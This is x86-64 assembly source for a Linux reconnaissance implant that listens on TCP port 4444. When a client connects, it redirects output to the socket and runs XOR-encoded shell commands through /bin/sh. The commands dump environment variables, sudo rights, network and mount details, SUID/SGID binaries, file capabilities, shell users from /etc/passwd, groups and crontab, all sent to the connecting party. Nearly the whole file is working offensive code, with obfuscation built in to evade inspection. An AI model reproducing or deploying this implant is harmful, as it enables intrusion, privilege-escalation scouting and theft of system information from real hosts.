; =============================================================================
; MODULAR RECONNAISSANCE TOOL
; =============================================================================
; This version demonstrates the modular architecture using three building blocks:
; 1. Crypto Engine (crypto_engine.asm)
; 2. Network Exfiltration (network_exfil.asm) 
; 3. Command Execution (command_exec.asm)
;
; Features:
; - XOR encrypted command strings (switchable crypto methods)
; - Network exfiltration via TCP (port 4444)
; - Comprehensive system reconnaissance
; - Modular design for easy extension
; =============================================================================

section .data
    ; ==========================================================================
    ; CRYPTO ENGINE DATA
    ; ==========================================================================
    decrypt_func dq simple_xor_decrypt
    xor_key db 0xAA, 0xBB, 0xCC, 0xDD

    ; ==========================================================================
    ; NETWORK EXFILTRATION DATA  
    ; ==========================================================================
    listen_port dw 4444
    sockaddr_in:
        dw 2                         ; AF_INET
        dw 0x5C11                    ; Port 4444 (network byte order)
        dd 0                         ; INADDR_ANY
        dq 0                         ; Padding

    ; ==========================================================================
    ; COMMAND EXECUTION DATA
    ; ==========================================================================
    shell db '/bin/sh', 0
    arg_c db '-c', 0
    devnull db '/dev/null', 0

    ; ==========================================================================
    ; RECONNAISSANCE COMMANDS (encrypted with XOR 0xAA)
    ; ==========================================================================
    commands dq cmd_env, cmd_sudo, cmd_hostname, cmd_ifconfig, cmd_mount, cmd_uname, cmd_getcap, cmd_find, cmd_grep, cmd_cat_group, cmd_cat_crontab, cmd_netstat, 0

    ; Header and footer for network transmission
    recon_header db '=== RECONNAISSANCE REPORT ===', 10, 0
    recon_footer db '=== END REPORT ===', 10, 0
    cmd_separator db 10, '--- Next Command ---', 10, 0

section .bss
    ; ==========================================================================
    ; SHARED BUFFERS
    ; ==========================================================================
    cmd_buffer resb 256              ; Crypto engine buffer
    output_buffer resb 8192          ; Command output capture buffer
    net_buffer resb 4096             ; Network operations buffer
    
    ; ==========================================================================
    ; NETWORK FILE DESCRIPTORS
    ; ==========================================================================
    socket_fd resq 1
    client_fd resq 1
    
    ; ==========================================================================
    ; COMMAND EXECUTION WORKSPACE
    ; ==========================================================================
    exec_buffer resb 4096
    child_pid resq 1
    exit_status resq 1

section .text
    global _start

; =============================================================================
; CRYPTO ENGINE BLOCK
; =============================================================================

copy_and_decode:
    call [decrypt_func]
    ret

simple_xor_decrypt:
    push rsi
    mov rsi, rdi
    mov rdi, cmd_buffer
.decode_loop:
    mov al, [rsi]
    test al, al
    jz .decode_done
    xor al, 0xAA
    mov [rdi], al
    inc rsi
    inc rdi
    jmp .decode_loop
.decode_done:
    mov byte [rdi], 0
    mov rdi, cmd_buffer
    pop rsi
    ret

multibyte_xor_decrypt:
    push rsi
    push rdx
    mov rsi, rdi
    mov rdi, cmd_buffer
    xor rdx, rdx
.decode_loop:
    mov al, [rsi]
    test al, al
    jz .decode_done
    mov cl, [xor_key + rdx]
    xor al, cl
    mov [rdi], al
    inc rsi
    inc rdi
    inc rdx
    cmp rdx, 4
    jl .decode_loop
    xor rdx, rdx
    jmp .decode_loop
.decode_done:
    mov byte [rdi], 0
    mov rdi, cmd_buffer
    pop rdx
    pop rsi
    ret

set_crypto_method:
    cmp rdi, 0
    je .set_simple_xor
    cmp rdi, 1
    je .set_multibyte_xor
    ret
.set_simple_xor:
    mov qword [decrypt_func], simple_xor_decrypt
    ret
.set_multibyte_xor:
    mov qword [decrypt_func], multibyte_xor_decrypt
    ret

; =============================================================================
; NETWORK EXFILTRATION BLOCK
; =============================================================================

strlen:
    push rdi
    xor rax, rax
.loop:
    cmp byte [rdi + rax], 0
    je .done
    inc rax
    jmp .loop
.done:
    pop rdi
    ret

create_socket:
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    ret

bind_socket:
    mov rax, 54
    mov rdi, [socket_fd]
    mov rsi, 1
    mov rdx, 2
    mov r10, rsp
    push 1
    mov r8, 4
    syscall
    add rsp, 8
    
    mov rax, 49
    mov rdi, [socket_fd]
    mov rsi, sockaddr_in
    mov rdx, 16
    syscall
    ret

listen_socket:
    mov rax, 50
    mov rdi, [socket_fd]
    mov rsi, 5
    syscall
    ret

init_network_listener:
    push rbp
    mov rbp, rsp
    
    call create_socket
    test rax, rax
    js .error
    mov [socket_fd], rax
    
    call bind_socket
    test rax, rax
    js .error
    
    call listen_socket
    test rax, rax
    js .error
    
    xor rax, rax
    jmp .done
.error:
    mov rax, -1
.done:
    mov rsp, rbp
    pop rbp
    ret

accept_connection:
    mov rax, 43
    mov rdi, [socket_fd]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    test rax, rax
    js .error
    mov [client_fd], rax
    ret
.error:
    mov rax, -1
    ret

send_string:
    push rbp
    mov rbp, rsp
    push rdi
    
    cmp qword [client_fd], 0
    je .error
    
    call strlen
    mov rdx, rax
    
    mov rax, 1
    mov rdi, [client_fd]
    mov rsi, [rsp]
    syscall
    
    test rax, rax
    js .error
    jmp .done
.error:
    mov rax, -1
.done:
    add rsp, 8
    mov rsp, rbp
    pop rbp
    ret

cleanup_network:
    cmp qword [client_fd], 0
    je .close_server
    mov rax, 3
    mov rdi, [client_fd]
    syscall
    mov qword [client_fd], 0

.close_server:
    cmp qword [socket_fd], 0
    je .done
    mov rax, 3
    mov rdi, [socket_fd]
    syscall
    mov qword [socket_fd], 0
.done:
    ret

; =============================================================================
; COMMAND EXECUTION BLOCK
; =============================================================================

execute_command:
    push rbp
    mov rbp, rsp
    push rdi
    
    mov rax, 57
    syscall
    
    test rax, rax
    jz .child_process
    jmp .parent_process

.child_process:
    push 0
    push qword [rsp + 8]
    push arg_c
    push shell
    mov rsi, rsp
    
    mov rax, 59
    mov rdi, shell
    xor rdx, rdx
    syscall
    
    mov rax, 60
    mov rdi, 1
    syscall

.parent_process:
    mov [child_pid], rax
    
    mov rdi, rax
    mov rax, 61
    sub rsp, 8
    mov rsi, rsp
    xor rdx, rdx
    xor r10, r10
    syscall
    
    mov rax, [rsp]
    add rsp, 8
    mov [exit_status], rax
    
    add rsp, 8
    mov rsp, rbp
    pop rbp
    ret

execute_command_capture:
    push rbp
    mov rbp, rsp
    push rdi
    push rsi
    push rdx
    
    ; Create pipe
    sub rsp, 16
    mov rax, 22
    mov rdi, rsp
    syscall
    test rax, rax
    js .error
    
    ; Fork
    mov rax, 57
    syscall
    test rax, rax
    jz .child_capture
    jmp .parent_capture

.child_capture:
    ; Close read end, redirect stdout to write end
    mov rax, 3
    mov rdi, [rsp]
    syscall
    
    mov rax, 33
    mov rdi, [rsp + 8]
    mov rsi, 1
    syscall
    
    mov rax, 3
    mov rdi, [rsp + 8]
    syscall
    
    ; Execute command
    push 0
    push qword [rsp + 32]
    push arg_c
    push shell
    mov rsi, rsp
    
    mov rax, 59
    mov rdi, shell
    xor rdx, rdx
    syscall
    
    mov rax, 60
    mov rdi, 1
    syscall

.parent_capture:
    push rax
    mov rax, 3
    mov rdi, [rsp + 8]
    syscall
    
    ; Read output
    mov rax, 0
    mov rdi, [rsp]
    mov rsi, [rsp + 32]
    mov rdx, [rsp + 24]
    syscall
    push rax
    
    ; Close read end
    mov rax, 3
    mov rdi, [rsp + 8]
    syscall
    
    ; Wait for child
    pop rdx
    pop rdi
    push rdx
    
    mov rax, 61
    sub rsp, 8
    mov rsi, rsp
    xor rdx, rdx
    xor r10, r10
    syscall
    add rsp, 8
    
    pop rax
    jmp .cleanup

.error:
    mov rax, -1

.cleanup:
    add rsp, 40
    mov rsp, rbp
    pop rbp
    ret

; =============================================================================
; MAIN RECONNAISSANCE LOGIC
; =============================================================================

_start:
    ; Initialize network listener
    call init_network_listener
    test rax, rax
    js .exit_error
    
    ; Wait for incoming connection
    call accept_connection
    test rax, rax
    js .exit_error
    
    ; Redirect stdout to client socket so command output goes over network
    mov rax, 33                      ; dup2 syscall
    mov rdi, [client_fd]             ; Client socket fd
    mov rsi, 1                       ; stdout
    syscall
    
    ; Send header
    mov rdi, recon_header
    call send_string
    
    ; Execute reconnaissance commands and send results
    mov rbx, commands
    
.recon_loop:
    mov rdi, [rbx]
    test rdi, rdi
    jz .recon_done
    
    ; Decode command
    call copy_and_decode
    
    ; Execute command (simple execution like original)
    mov rdi, cmd_buffer
    call execute_command
    
    ; Send separator (the output goes directly to the client via stdout redirection)
    mov rdi, cmd_separator
    call send_string
    
.next_command:
    add rbx, 8
    jmp .recon_loop
    
.recon_done:
    ; Send footer
    mov rdi, recon_footer
    call send_string
    
    ; Cleanup and exit
    call cleanup_network
    
    mov rax, 60
    xor rdi, rdi
    syscall

.exit_error:
    call cleanup_network
    mov rax, 60
    mov rdi, 1
    syscall

; =============================================================================
; ENCRYPTED RECONNAISSANCE COMMANDS
; =============================================================================
cmd_env:
    db 0xcf, 0xc4, 0xdc, 0              ; "env"
    
cmd_sudo:
    db 0xd9, 0xdf, 0xce, 0xc5, 0x8a, 0x87, 0xc6, 0  ; "sudo -l"
    
cmd_hostname:
    db 0xc2, 0xc5, 0xd9, 0xde, 0xc4, 0xcb, 0xc7, 0xcf, 0x8a, 0x87, 0xe3, 0  ; "hostname -I"
    
cmd_ifconfig:
    db 0xc3, 0xcc, 0xc9, 0xc5, 0xc4, 0xcc, 0xc3, 0xcd, 0  ; "ifconfig"
    
cmd_mount:
    db 0xc7, 0xc5, 0xdf, 0xc4, 0xde, 0  ; "mount"
    
cmd_uname:
    db 0xdf, 0xc4, 0xcb, 0xc7, 0xcf, 0x8a, 0x87, 0xcb, 0  ; "uname -a"
    
cmd_getcap:
    db 0xde, 0xc3, 0xc7, 0xcf, 0xc5, 0xdf, 0xde, 0x8a, 0x9b, 0x9a, 0x8a, 0xcd, 0xcf, 0xde, 0xc9, 0xcb, 0xda, 0x8a, 0x87, 0xd8, 0x8a, 0x85, 0x8a, 0x98, 0x94, 0x85, 0xce, 0xcf, 0xdc, 0x85, 0xc4, 0xdf, 0xc6, 0xc6, 0  ; "timeout 10 getcap -r / 2>/dev/null"
    
cmd_find:
    db 0xde, 0xc3, 0xc7, 0xcf, 0xc5, 0xdf, 0xde, 0x8a, 0x9b, 0x9a, 0x8a, 0xcc, 0xc3, 0xc4, 0xce, 0x8a, 0x85, 0x8a, 0x87, 0xda, 0xcf, 0xd8, 0xc7, 0x8a, 0x87, 0x9c, 0x9a, 0x9a, 0x9a, 0x8a, 0x87, 0xc5, 0xd8, 0x8a, 0x87, 0xda, 0xcf, 0xd8, 0xc7, 0x8a, 0x87, 0x98, 0x9a, 0x9a, 0x9a, 0x8a, 0x98, 0x94, 0x85, 0xce, 0xcf, 0xdc, 0x85, 0xc4, 0xdf, 0xc6, 0xc6, 0  ; "timeout 10 find / -perm -6000 -or -perm -2000 2>/dev/null"

cmd_grep:
    db 0xcd, 0xd8, 0xcf, 0xda, 0x8a, 0x88, 0xd9, 0xc2, 0x8e, 0x88, 0x8a, 0x85, 0xcf, 0xde, 0xc9, 0x85, 0xda, 0xcb, 0xd9, 0xd9, 0xdd, 0xce, 0  ; "grep "sh$" /etc/passwd"

cmd_cat_group:
    db 0xc9, 0xcb, 0xde, 0x8a, 0x85, 0xcf, 0xde, 0xc9, 0x85, 0xcd, 0xd8, 0xc5, 0xdf, 0xda, 0  ; "cat /etc/group"

cmd_cat_crontab:
    db 0xc9, 0xcb, 0xde, 0x8a, 0x85, 0xcf, 0xde, 0xc9, 0x85, 0xc9, 0xd8, 0xc5, 0xc4, 0xde, 0xcb, 0xc8, 0  ; "cat /etc/crontab"

cmd_netstat:
    db 0xc4, 0xcf, 0xde, 0xd9, 0xde, 0xcb, 0xde, 0x8a, 0x87, 0xde, 0xdf, 0xc6, 0xc4, 0  ; "netstat -tuln"
